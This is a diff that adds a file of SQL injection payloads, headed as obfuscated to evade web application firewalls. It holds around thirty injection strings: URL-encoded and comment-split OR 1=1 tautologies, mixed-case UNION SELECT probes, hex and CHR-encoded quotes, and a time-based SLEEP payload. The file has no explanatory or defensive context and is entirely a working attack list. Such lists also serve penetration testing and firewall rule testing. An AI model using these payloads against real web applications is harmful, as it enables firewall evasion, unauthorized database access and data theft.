@@ -1,0 +1,32 @@
+# WAF Bypass SQL Injection Payloads
+# Obfuscated to evade Web Application Firewalls
+%27 OR %271%27=%271
+%27%20OR%20%271%27=%271
+' /*!OR*/ '1'='1
+'/**/OR/**/'1'='1
+' %0aOR%0a '1'='1
+' %09OR%09 '1'='1
+'%20/*!50000OR*/1=1--
+' UNION%20SELECT%20NULL--
+' uNiOn SeLeCt NuLl--
+' UnIoN sElEcT nUlL--
+'||'1'='1
+'||1=1--
+' OR 1=1 /*!AND*/ 1=1--
+%27+OR+%271%27%3D%271
+0x27204f522027313d2731
+CHR(39)||CHR(79)||CHR(82)||CHR(39)||CHR(49)||CHR(61)||CHR(49)
+' /*!50000OR*/ 1=1--
+'%20OR%201%3D1--
+' OR/**/'1'/**/='1
+/*!50000SELECT*/ NULL--
+' OR 1/* comment */=/* comment */1--
+1;%00SELECT%20SLEEP(5)--
+' OR CHAR(49)=CHAR(49)--
+' OR HEX(1)=HEX(1)--
+' OR 0x31=0x31--
+' OR 1 LIKE 1--
+' OR 1 REGEXP 1--
+' OR 1 BETWEEN 0 AND 2--
+'+OR+'1'='1
+%2527 OR %25271%2527=%25271
